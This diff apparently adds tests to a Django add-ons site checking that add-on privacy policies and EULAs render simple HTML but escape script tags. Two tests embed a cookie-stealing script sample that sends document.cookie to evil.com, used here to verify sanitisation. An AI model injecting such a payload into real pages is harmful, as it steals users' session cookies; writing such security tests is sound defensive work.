@@ -8,7 +8,7 @@ from django.core.cache import cache
 from django.utils import translation
 from django.utils.encoding import iri_to_uri
 
-from nose.tools import eq_
+from nose.tools import eq_, set_trace
 import test_utils
 from pyquery import PyQuery as pq
 
@@ -22,6 +22,10 @@ from tags.models import Tag, AddonTag
 from translations.helpers import truncate
 from translations.query import order_by_translation
 
+
+def norm(s):
+    """Normalize a string so that whitespace is uniform."""
+    return re.sub(r'[\s]+', ' ', str(s)).strip()
 
 class TestHomepage(test_utils.TestCase):
     fixtures = ['base/apps',
@@ -496,6 +500,55 @@ class TestDetailPage(test_utils.TestCase):
         privacy_url = reverse('addons.privacy', args=[addon.id])
         assert doc('.privacy-policy').attr('href').endswith(privacy_url)
 
+    def test_simple_html_is_rendered_in_privacy(self):
+        addon = Addon.objects.get(id=3615)
+        addon.privacy_policy = """
+            <strong> what the hell..</strong>
+            <ul>
+                <li>papparapara</li>
+                <li>todotodotodo</li>
+            </ul>
+            <ol>
+                <a href="irc://irc.mozilla.org/firefox">firefox</a>
+
+                Introduce yourself to the community, if you like!
+                This text will appear publicly on your user info page.
+                <li>papparapara2</li>
+                <li>todotodotodo2</li>
+            </ol>
+            """
+        addon.save()
+
+        r = self.client.get(reverse('addons.privacy', args=[addon.id]))
+        doc = pq(r.content)
+
+        eq_(norm(doc(".policy-statement strong")),
+            "<strong> what the hell..</strong>")
+        eq_(norm(doc(".policy-statement ul")),
+            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
+        eq_(doc(".policy-statement ol a").text(),
+            "firefox")
+        eq_(norm(doc(".policy-statement ol li:first")),
+            "<li>papparapara2</li>")
+
+    def test_evil_html_is_not_rendered_in_privacy(self):
+        addon = Addon.objects.get(id=3615)
+        addon.privacy_policy = """
+            <script type="text/javascript">
+                window.location = 'http://evil.com/?c=' + document.cookie;
+            </script>
+            Muhuhahahahahahaha!
+            """
+        addon.save()
+
+        r = self.client.get(reverse('addons.privacy', args=[addon.id]))
+        doc = pq(r.content)
+
+        policy = str(doc(".policy-statement"))
+        assert policy.startswith(
+                    '<div class="policy-statement">&lt;script'), (
+                                            'Unexpected: %s' % policy[0:50])
+
     def test_button_size(self):
         """Make sure install buttons on the detail page are prominent."""
         response = self.client.get(reverse('addons.detail', args=[3615]),
@@ -631,6 +684,55 @@ class TestEula(test_utils.TestCase):
         addon = Addon.objects.get(id=11730)
         r = self.client.get(reverse('addons.eula', args=[addon.id]))
         eq_(r.context['version'], addon.current_version)
+
+    def test_simple_html_is_rendered(self):
+        addon = Addon.objects.get(id=11730)
+        addon.eula = """
+            <strong> what the hell..</strong>
+            <ul>
+                <li>papparapara</li>
+                <li>todotodotodo</li>
+            </ul>
+            <ol>
+                <a href="irc://irc.mozilla.org/firefox">firefox</a>
+
+                Introduce yourself to the community, if you like!
+                This text will appear publicly on your user info page.
+                <li>papparapara2</li>
+                <li>todotodotodo2</li>
+            </ol>
+            """
+        addon.save()
+
+        r = self.client.get(reverse('addons.eula', args=[addon.id]))
+        doc = pq(r.content)
+
+        eq_(norm(doc(".policy-statement strong")),
+            "<strong> what the hell..</strong>")
+        eq_(norm(doc(".policy-statement ul")),
+            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
+        eq_(doc(".policy-statement ol a").text(),
+            "firefox")
+        eq_(norm(doc(".policy-statement ol li:first")),
+            "<li>papparapara2</li>")
+
+    def test_evil_html_is_not_rendered(self):
+        addon = Addon.objects.get(id=11730)
+        addon.eula = """
+            <script type="text/javascript">
+                window.location = 'http://evil.com/?c=' + document.cookie;
+            </script>
+            Muhuhahahahahahaha!
+            """
+        addon.save()
+
+        r = self.client.get(reverse('addons.eula', args=[addon.id]))
+        doc = pq(r.content)
+
+        policy = str(doc(".policy-statement"))
+        assert policy.startswith(
+                    '<div class="policy-statement">&lt;script'), (
+                                            'Unexpected: %s' % policy[0:50])
 
     def test_old_version(self):
         addon = Addon.objects.get(id=11730)
